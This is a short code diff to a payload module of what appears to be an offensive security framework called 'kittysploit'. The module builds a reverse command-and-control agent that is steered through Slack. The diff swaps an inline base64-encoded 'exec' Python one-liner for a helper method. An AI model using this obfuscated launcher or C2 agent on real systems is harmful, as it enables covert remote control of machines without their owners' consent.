@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import base64
-
 from kittysploit import *
 
 from lib.c2.slack_reverse_agent import build_slack_reverse_agent_script
@@ -39,6 +37,4 @@ class Module(Payload):
             str(self.command_prefix or "!ks"),
             float(int(self.poll_interval or 3)),
         )
-        enc = base64.b64encode(script.encode()).decode("ascii")
-        py = str(self.python_binary or "python3")
-        return f'{py} -c "import base64;exec(base64.b64decode(\'{enc}\').decode())"'
+        return self._encode_python_one_liner(script, self.python_binary)
